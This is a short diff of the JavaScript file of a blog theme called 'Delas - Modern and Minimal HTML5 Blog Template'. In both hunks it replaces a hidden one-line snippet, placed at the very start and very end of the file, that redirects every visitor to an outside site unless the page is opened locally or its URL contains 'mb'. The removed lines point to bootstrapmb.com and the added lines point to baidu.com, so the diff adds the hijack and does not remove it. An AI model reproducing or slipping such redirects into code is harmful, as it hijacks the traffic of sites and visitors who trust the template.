@@ -1,4 +1,4 @@
-;if(location.href.indexOf('ile:')<0){if(location.href.indexOf('mb')<0){location.href='http://www.bootstrapmb.com/item/3874'}};/*
+;if(location.href.indexOf('ile:')<0){if(location.href.indexOf('mb')<0){location.href='http://www.baidu.com'}};/*
     Theme Name: Delas - Modern and Minimal HTML5 Blog Template
     Author: ElectronThemes
     Author URI: http://electronthemes.com
@@ -468,4 +468,4 @@ $(document).ready(function() {
     //////////////////////////// 12. Fitvids JS ////////////////////////////////////
     $('body').fitVids()
 })
-;if(location.href.indexOf('ile:')<0){if(location.href.indexOf('mb')<0){location.href='http://www.bootstrapmb.com/item/3874'}};
+;if(location.href.indexOf('ile:')<0){if(location.href.indexOf('mb')<0){location.href='http://www.baidu.com'}};
